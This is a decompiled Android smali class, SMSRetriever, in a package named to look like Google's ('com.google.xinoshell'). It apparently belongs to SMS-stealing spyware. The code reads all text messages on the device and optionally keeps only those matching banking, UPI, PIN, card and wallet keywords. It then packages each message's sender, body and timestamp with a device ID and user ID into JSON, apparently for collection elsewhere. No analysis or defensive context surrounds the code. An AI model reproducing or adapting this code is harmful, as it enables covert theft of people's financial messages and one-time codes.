.class public Lcom/google/xinoshell/utils/SMSRetriever;
.super Ljava/lang/Object;
.source "SMSRetriever.java"


# static fields
.field private static final SMS_URI:Landroid/net/Uri;


# instance fields
.field private final context:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 15
    const-string v0, "content://sms/"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    sput-object v0, Lcom/google/xinoshell/utils/SMSRetriever;->SMS_URI:Landroid/net/Uri;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 18
    iput-object p1, p0, Lcom/google/xinoshell/utils/SMSRetriever;->context:Landroid/content/Context;

    .line 19
    return-void
.end method

.method private containsKeyword(Ljava/lang/String;[Ljava/lang/String;)Z
    .locals 6
    .param p1, "text"    # Ljava/lang/String;
    .param p2, "keywords"    # [Ljava/lang/String;

    .line 126
    const/4 v0, 0x0

    if-eqz p1, :cond_3

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_1

    .line 130
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    .line 131
    .local v1, "lowerText":Ljava/lang/String;
    array-length v2, p2

    move v3, v0

    :goto_0
    if-ge v3, v2, :cond_2

    aget-object v4, p2, v3

    .line 132
    .local v4, "keyword":Ljava/lang/String;
    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 133
    const/4 v0, 0x1

    return v0

    .line 131
    .end local v4    # "keyword":Ljava/lang/String;
    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 136
    :cond_2
    return v0

    .line 127
    .end local v1    # "lowerText":Ljava/lang/String;
    :cond_3
    :goto_1
    return v0
.end method

.method private getIntFromCursor(Landroid/database/Cursor;Ljava/lang/String;)I
    .locals 3
    .param p1, "cursor"    # Landroid/database/Cursor;
    .param p2, "columnName"    # Ljava/lang/String;

    .line 118
    const/4 v0, 0x0

    :try_start_0
    invoke-interface {p1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 119
    .local v1, "index":I
    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    invoke-interface {p1, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return v0

    .line 120
    .end local v1    # "index":I
    :catch_0
    move-exception v1

    .line 121
    .local v1, "e":Ljava/lang/Exception;
    return v0
.end method

.method private getLongFromCursor(Landroid/database/Cursor;Ljava/lang/String;)J
    .locals 4
    .param p1, "cursor"    # Landroid/database/Cursor;
    .param p2, "columnName"    # Ljava/lang/String;

    .line 109
    const-wide/16 v0, 0x0

    :try_start_0
    invoke-interface {p1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    .line 110
    .local v2, "index":I
    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-wide v0

    .line 111
    .end local v2    # "index":I
    :catch_0
    move-exception v2

    .line 112
    .local v2, "e":Ljava/lang/Exception;
    return-wide v0
.end method

.method private getMessageType(I)Ljava/lang/String;
    .locals 1
    .param p1, "type"    # I

    .line 87
    packed-switch p1, :pswitch_data_0

    .line 94
    const-string v0, "unknown"

    return-object v0

    .line 93
    :pswitch_0
    const-string v0, "queued"

    return-object v0

    .line 92
    :pswitch_1
    const-string v0, "failed"

    return-object v0

    .line 91
    :pswitch_2
    const-string v0, "outbox"

    return-object v0

    .line 90
    :pswitch_3
    const-string v0, "draft"

    return-object v0

    .line 89
    :pswitch_4
    const-string v0, "outgoing"

    return-object v0

    .line 88
    :pswitch_5
    const-string v0, "incoming"

    return-object v0

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private getStringFromCursor(Landroid/database/Cursor;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "cursor"    # Landroid/database/Cursor;
    .param p2, "columnName"    # Ljava/lang/String;

    .line 100
    const-string v0, ""

    :try_start_0
    invoke-interface {p1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 101
    .local v1, "index":I
    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    invoke-interface {p1, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-object v0

    .line 102
    .end local v1    # "index":I
    :catch_0
    move-exception v1

    .line 103
    .local v1, "e":Ljava/lang/Exception;
    return-object v0
.end method


# virtual methods
.method public getAllMessages(Z)Lorg/json/JSONArray;
    .locals 21
    .param p1, "filterByKeywords"    # Z

    .line 22
    move-object/from16 v1, p0

    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v0

    .line 23
    .local v2, "messagesArray":Lorg/json/JSONArray;
    const/4 v0, 0x6

    new-array v3, v0, [Ljava/lang/String;

    const-string v4, "_id"

    const/4 v5, 0x0

    aput-object v4, v3, v5

    const/4 v4, 0x1

    const-string v6, "address"

    aput-object v6, v3, v4

    const/4 v7, 0x2

    const-string v8, "body"

    aput-object v8, v3, v7

    const/4 v9, 0x3

    const-string v10, "date"

    aput-object v10, v3, v9

    const/4 v11, 0x4

    const-string v12, "type"

    aput-object v12, v3, v11

    const-string v13, "read"

    const/4 v14, 0x5

    aput-object v13, v3, v14

    move-object/from16 v17, v3

    .line 28
    .local v17, "projection":[Ljava/lang/String;
    const/16 v3, 0x1d

    new-array v3, v3, [Ljava/lang/String;

    const-string v13, "upi"

    aput-object v13, v3, v5

    const-string v5, "transaction"

    aput-object v5, v3, v4

    const-string v4, "credited"

    aput-object v4, v3, v7

    const-string v4, "debited"

    aput-object v4, v3, v9

    const-string v4, "balance"

    aput-object v4, v3, v11

    const-string v4, "account"

    aput-object v4, v3, v14

    const-string v4, "payment"

    aput-object v4, v3, v0

    const/4 v0, 0x7

    const-string v4, "bank"

    aput-object v4, v3, v0

    const/16 v0, 0x8

    const-string v4, "amount"

    aput-object v4, v3, v0

    const/16 v0, 0x9

    const-string v4, "imps"

    aput-object v4, v3, v0

    const/16 v0, 0xa

    const-string v4, "neft"

    aput-object v4, v3, v0

    const/16 v0, 0xb

    const-string v4, "rtgs"

    aput-object v4, v3, v0

    const/16 v0, 0xc

    const-string v4, "ref"

    aput-object v4, v3, v0

    const/16 v0, 0xd

    const-string v4, "reference"

    aput-object v4, v3, v0

    const/16 v0, 0xe

    const-string v4, "withdrawn"

    aput-object v4, v3, v0

    const/16 v0, 0xf

    const-string v4, "deposit"

    aput-object v4, v3, v0

    const/16 v0, 0x10

    const-string v4, "received"

    aput-object v4, v3, v0

    const/16 v0, 0x11

    const-string v4, "sent"

    aput-object v4, v3, v0

    const/16 v0, 0x12

    const-string v4, "failed"

    aput-object v4, v3, v0

    const/16 v0, 0x13

    const-string v4, "success"

    aput-object v4, v3, v0

    const/16 v0, 0x14

    const-string v4, "pin"

    aput-object v4, v3, v0

    const/16 v0, 0x15

    const-string v4, "atm"

    aput-object v4, v3, v0

    const/16 v0, 0x16

    const-string v4, "card"

    aput-object v4, v3, v0

    const/16 v0, 0x17

    const-string v4, "rupay"

    aput-object v4, v3, v0

    const/16 v0, 0x18

    const-string v4, "visa"

    aput-object v4, v3, v0

    const/16 v0, 0x19

    const-string v4, "mastercard"

    aput-object v4, v3, v0

    const/16 v0, 0x1a

    const-string v4, "loan"

    aput-object v4, v3, v0

    const/16 v0, 0x1b

    const-string v4, "EMI"

    aput-object v4, v3, v0

    const/16 v0, 0x1c

    const-string v4, "wallet"

    aput-object v4, v3, v0

    .line 35
    .local v3, "keywords":[Ljava/lang/String;
    :try_start_0
    iget-object v0, v1, Lcom/google/xinoshell/utils/SMSRetriever;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v15

    sget-object v16, Lcom/google/xinoshell/utils/SMSRetriever;->SMS_URI:Landroid/net/Uri;

    const-string v20, "date DESC"

    const/16 v18, 0x0

    const/16 v19, 0x0

    invoke-virtual/range {v15 .. v20}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_5

    move-object v4, v0

    .line 42
    .local v4, "cursor":Landroid/database/Cursor;
    if-nez v4, :cond_1

    .line 43
    nop

    .line 79
    if-eqz v4, :cond_0

    :try_start_1
    invoke-interface {v4}, Landroid/database/Cursor;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .end local v4    # "cursor":Landroid/database/Cursor;
    :catch_0
    move-exception v0

    move-object/from16 v16, v3

    goto/16 :goto_8

    .line 43
    .restart local v4    # "cursor":Landroid/database/Cursor;
    :cond_0
    :goto_0
    return-object v2

    .line 46
    :cond_1
    :goto_1
    :try_start_2
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    if-eqz v0, :cond_6

    .line 48
    :try_start_3
    invoke-direct {v1, v4, v8}, Lcom/google/xinoshell/utils/SMSRetriever;->getStringFromCursor(Landroid/database/Cursor;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 49
    .local v0, "message":Ljava/lang/String;
    if-eqz v0, :cond_5

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v5
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    if-eqz v5, :cond_2

    move-object/from16 v18, v0

    move-object/from16 v16, v3

    goto/16 :goto_4

    .line 53
    :cond_2
    if-eqz p1, :cond_4

    :try_start_4
    invoke-direct {v1, v0, v3}, Lcom/google/xinoshell/utils/SMSRetriever;->containsKeyword(Ljava/lang/String;[Ljava/lang/String;)Z

    move-result v5
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    if-eqz v5, :cond_3

    goto :goto_2

    :cond_3
    move-object/from16 v16, v3

    goto :goto_3

    .line 35
    .end local v0    # "message":Ljava/lang/String;
    :catchall_0
    move-exception v0

    move-object/from16 v16, v3

    move-object v3, v0

    goto/16 :goto_6

    .line 75
    :catch_1
    move-exception v0

    move-object/from16 v16, v3

    goto/16 :goto_5

    .line 54
    .restart local v0    # "message":Ljava/lang/String;
    :cond_4
    :goto_2
    :try_start_5
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 55
    .local v5, "messageData":Lorg/json/JSONObject;
    invoke-direct {v1, v4, v6}, Lcom/google/xinoshell/utils/SMSRetriever;->getStringFromCursor(Landroid/database/Cursor;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 56
    .local v7, "sender":Ljava/lang/String;
    invoke-direct {v1, v4, v10}, Lcom/google/xinoshell/utils/SMSRetriever;->getLongFromCursor(Landroid/database/Cursor;Ljava/lang/String;)J

    move-result-wide v13

    .line 57
    .local v13, "dateMillis":J
    invoke-direct {v1, v4, v12}, Lcom/google/xinoshell/utils/SMSRetriever;->getIntFromCursor(Landroid/database/Cursor;Ljava/lang/String;)I

    move-result v9

    .line 59
    .local v9, "type":I
    new-instance v11, Ljava/text/SimpleDateFormat;

    const-string v15, "yyyy-MM-dd\'T\'HH:mm:ss.SSSXXX"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 61
    move-object/from16 v16, v3

    .end local v3    # "keywords":[Ljava/lang/String;
    .local v16, "keywords":[Ljava/lang/String;
    :try_start_6
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-direct {v11, v15, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 63
    .local v11, "sdf":Ljava/text/SimpleDateFormat;
    const-string v3, "UTC"

    invoke-static {v3}, Ljava/util/TimeZone;->getTimeZone(Ljava/lang/String;)Ljava/util/TimeZone;

    move-result-object v3

    invoke-virtual {v11, v3}, Ljava/text/SimpleDateFormat;->setTimeZone(Ljava/util/TimeZone;)V

    .line 64
    new-instance v3, Ljava/util/Date;

    invoke-direct {v3, v13, v14}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v11, v3}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    .line 66
    .local v3, "timestamp":Ljava/lang/String;
    const-string v15, "timestamp"

    invoke-virtual {v5, v15, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 67
    const-string v15, "sender"

    invoke-virtual {v5, v15, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 68
    const-string v15, "textMessage"

    invoke-virtual {v5, v15, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 69
    invoke-direct {v1, v9}, Lcom/google/xinoshell/utils/SMSRetriever;->getMessageType(I)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v5, v12, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 70
    const-string v15, "deviceId"

    move-object/from16 v18, v0

    .end local v0    # "message":Ljava/lang/String;
    .local v18, "message":Ljava/lang/String;
    iget-object v0, v1, Lcom/google/xinoshell/utils/SMSRetriever;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v15, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 71
    const-string v0, "userId"

    sget-object v15, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v5, v0, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 73
    invoke-virtual {v2, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    .line 77
    .end local v3    # "timestamp":Ljava/lang/String;
    .end local v5    # "messageData":Lorg/json/JSONObject;
    .end local v7    # "sender":Ljava/lang/String;
    .end local v9    # "type":I
    .end local v11    # "sdf":Ljava/text/SimpleDateFormat;
    .end local v13    # "dateMillis":J
    .end local v18    # "message":Ljava/lang/String;
    :goto_3
    move-object/from16 v3, v16

    goto/16 :goto_1

    .line 35
    :catchall_1
    move-exception v0

    move-object v3, v0

    goto :goto_6

    .line 75
    :catch_2
    move-exception v0

    goto :goto_5

    .line 49
    .end local v16    # "keywords":[Ljava/lang/String;
    .restart local v0    # "message":Ljava/lang/String;
    .local v3, "keywords":[Ljava/lang/String;
    :cond_5
    move-object/from16 v18, v0

    move-object/from16 v16, v3

    .line 50
    .end local v0    # "message":Ljava/lang/String;
    .end local v3    # "keywords":[Ljava/lang/String;
    .restart local v16    # "keywords":[Ljava/lang/String;
    .restart local v18    # "message":Ljava/lang/String;
    :goto_4
    move-object/from16 v3, v16

    goto/16 :goto_1

    .line 75
    .end local v16    # "keywords":[Ljava/lang/String;
    .end local v18    # "message":Ljava/lang/String;
    .restart local v3    # "keywords":[Ljava/lang/String;
    :catch_3
    move-exception v0

    move-object/from16 v16, v3

    .line 76
    .end local v3    # "keywords":[Ljava/lang/String;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v16    # "keywords":[Ljava/lang/String;
    :goto_5
    move-object/from16 v3, v16

    goto/16 :goto_1

    .line 79
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v16    # "keywords":[Ljava/lang/String;
    .restart local v3    # "keywords":[Ljava/lang/String;
    :cond_6
    move-object/from16 v16, v3

    .end local v3    # "keywords":[Ljava/lang/String;
    .restart local v16    # "keywords":[Ljava/lang/String;
    if-eqz v4, :cond_7

    :try_start_7
    invoke-interface {v4}, Landroid/database/Cursor;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    .line 81
    .end local v4    # "cursor":Landroid/database/Cursor;
    :cond_7
    nop

    .line 83
    return-object v2

    .line 35
    .end local v16    # "keywords":[Ljava/lang/String;
    .restart local v3    # "keywords":[Ljava/lang/String;
    .restart local v4    # "cursor":Landroid/database/Cursor;
    :catchall_2
    move-exception v0

    move-object/from16 v16, v3

    move-object v3, v0

    .end local v3    # "keywords":[Ljava/lang/String;
    .restart local v16    # "keywords":[Ljava/lang/String;
    :goto_6
    if-eqz v4, :cond_8

    :try_start_8
    invoke-interface {v4}, Landroid/database/Cursor;->close()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_3

    goto :goto_7

    :catchall_3
    move-exception v0

    :try_start_9
    invoke-virtual {v3, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local v2    # "messagesArray":Lorg/json/JSONArray;
    .end local v16    # "keywords":[Ljava/lang/String;
    .end local v17    # "projection":[Ljava/lang/String;
    .end local p1    # "filterByKeywords":Z
    :cond_8
    :goto_7
    throw v3
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    .line 79
    .end local v4    # "cursor":Landroid/database/Cursor;
    .restart local v2    # "messagesArray":Lorg/json/JSONArray;
    .restart local v16    # "keywords":[Ljava/lang/String;
    .restart local v17    # "projection":[Ljava/lang/String;
    .restart local p1    # "filterByKeywords":Z
    :catch_4
    move-exception v0

    goto :goto_8

    .end local v16    # "keywords":[Ljava/lang/String;
    .restart local v3    # "keywords":[Ljava/lang/String;
    :catch_5
    move-exception v0

    move-object/from16 v16, v3

    .line 80
    .end local v3    # "keywords":[Ljava/lang/String;
    .restart local v0    # "e":Ljava/lang/Exception;
    .restart local v16    # "keywords":[Ljava/lang/String;
    :goto_8
    return-object v2
.end method
